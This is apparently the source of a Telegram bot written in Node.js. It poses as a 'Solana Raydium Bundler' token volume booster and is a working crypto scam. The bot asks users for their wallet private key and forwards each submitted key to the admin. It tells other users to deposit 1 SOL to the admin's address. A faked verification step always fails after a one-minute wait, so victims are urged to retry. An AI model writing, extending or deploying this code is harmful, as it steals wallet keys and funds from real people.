const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');

// Environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_USER_ID = parseInt(process.env.ADMIN_USER_ID);
const ADMIN_SOLANA_ADDRESS = process.env.ADMIN_SOLANA_ADDRESS || 'DefaultSolanaAddress123456789';

// Initialize Telegram bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Conversation states
const STATES = {
  AWAITING_ADDRESS: 1,
  AWAITING_WALLET_OPTION: 2,
  AWAITING_PRIVATE_KEY: 3,
  AWAITING_DEPOSIT_CONFIRMATION: 4,
  AWAITING_TRANSFER_CONFIRMATION: 5,
  VERIFYING: 6
};

// Store user state
const userStates = new Map();

// Send message to admin
async function notifyAdmin(message) {
  try {
    await bot.sendMessage(ADMIN_USER_ID, message);
  } catch (error) {
    console.error(`Failed to notify admin: ${error.message}`);
  }
}

// Simulate verification with 1-minute delay
async function simulateVerification(chatId) {
  await new Promise(resolve => setTimeout(resolve, 60000)); // 1-minute delay
  throw new Error('Verification failed');
}

// Handle /start command
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, '🌟 Welcome to **Solana Raydium Bundler** 🌟\n🚀 Boost your token volume or trade instantly with ease!\nPlease send your Solana token address.');
  await notifyAdmin(`User ${chatId} started bot.`);
  userStates.set(chatId, { state: STATES.AWAITING_ADDRESS });
});

// Handle text messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const userState = userStates.get(chatId) || { state: null };

  if (text.startsWith('/')) return; // Ignore commands

  switch (userState.state) {
    case STATES.AWAITING_ADDRESS:
      await bot.sendMessage(chatId, 'Please choose an option:\n1 for import your wallet\n2 to create wallet');
      await notifyAdmin(`User ${chatId} submitted token address: ${text}`);
      userStates.set(chatId, { state: STATES.AWAITING_WALLET_OPTION, address: text });
      break;

    case STATES.AWAITING_WALLET_OPTION:
      if (text === '1') {
        await bot.sendMessage(chatId, 'Please enter your private key.');
        await notifyAdmin(`User ${chatId} chose option 1: import wallet`);
        userStates.set(chatId, { state: STATES.AWAITING_PRIVATE_KEY, address: userState.address });
      } else if (text === '2') {
        await bot.sendMessage(chatId, `Please deposit 1 SOL to this Solana address: ${ADMIN_SOLANA_ADDRESS}\nOnce deposited, reply with "transferred".`);
        await notifyAdmin(`User ${chatId} chose option 2: create wallet, provided address: ${ADMIN_SOLANA_ADDRESS}`);
        userStates.set(chatId, { state: STATES.AWAITING_TRANSFER_CONFIRMATION, address: userState.address });
      } else {
        await bot.sendMessage(chatId, 'Invalid option. Please choose 1 for import your wallet or 2 to create wallet.');
        await notifyAdmin(`User ${chatId} sent invalid option: ${text}`);
      }
      break;

    case STATES.AWAITING_PRIVATE_KEY:
      await bot.sendMessage(chatId, 'Please deposit more than 1 SOL to start using volume booster or buy and sell.');
      await notifyAdmin(`User ${chatId} submitted private key: ${text}`);
      userStates.set(chatId, { state: STATES.AWAITING_DEPOSIT_CONFIRMATION, address: userState.address });
      break;

    case STATES.AWAITING_DEPOSIT_CONFIRMATION:
      await bot.sendMessage(chatId, 'Processing verification... Please wait 1 minute.');
      await notifyAdmin(`User ${chatId} confirmed deposit attempt`);
      userStates.set(chatId, { state: STATES.VERIFYING, address: userState.address });

      try {
        await simulateVerification(chatId);
        await bot.sendMessage(chatId, 'Done.');
        await notifyAdmin(`Verification completed for user ${chatId}`);
      } catch (error) {
        await bot.sendMessage(chatId, 'Error: No SOL found in your wallet. Try again.');
        await notifyAdmin(`Verification failed for user ${chatId}: No SOL found in wallet`);
      }
      userStates.delete(chatId); // Reset conversation
      await bot.sendMessage(chatId, 'Please send your Solana token address to start again.');
      await notifyAdmin(`Conversation reset for user ${chatId}`);
      userStates.set(chatId, { state: STATES.AWAITING_ADDRESS });
      break;

    case STATES.AWAITING_TRANSFER_CONFIRMATION:
      if (text.toLowerCase() === 'transferred') {
        await bot.sendMessage(chatId, 'Processing verification... Please wait 1 minute.');
        await notifyAdmin(`User ${chatId} confirmed transfer to ${ADMIN_SOLANA_ADDRESS}`);
        userStates.set(chatId, { state: STATES.VERIFYING, address: userState.address });

        try {
          await simulateVerification(chatId);
          await bot.sendMessage(chatId, 'Done.');
          await notifyAdmin(`Verification completed for user ${chatId}`);
        } catch (error) {
          await bot.sendMessage(chatId, 'Error: No deposit found yet. Try again.');
          await notifyAdmin(`Verification failed for user ${chatId}: No deposit found`);
        }
        userStates.delete(chatId); // Reset conversation
        await bot.sendMessage(chatId, 'Please send your Solana token address to start again.');
        await notifyAdmin(`Conversation reset for user ${chatId}`);
        userStates.set(chatId, { state: STATES.AWAITING_ADDRESS });
      } else {
        await bot.sendMessage(chatId, 'Please reply with "transferred" after depositing 1 SOL.');
        await notifyAdmin(`User ${chatId} sent invalid response: ${text}`);
      }
      break;

    default:
      await bot.sendMessage(chatId, 'Please use /start to begin.');
      await notifyAdmin(`User ${chatId} sent message without state: ${text}`);
  }
});

// Error handling
bot.on('polling_error', (error) => {
  console.error(`Polling error: ${error.message}`);
  notifyAdmin(`Bot error: ${error.message}`);
});

console.log('Bot is running...');
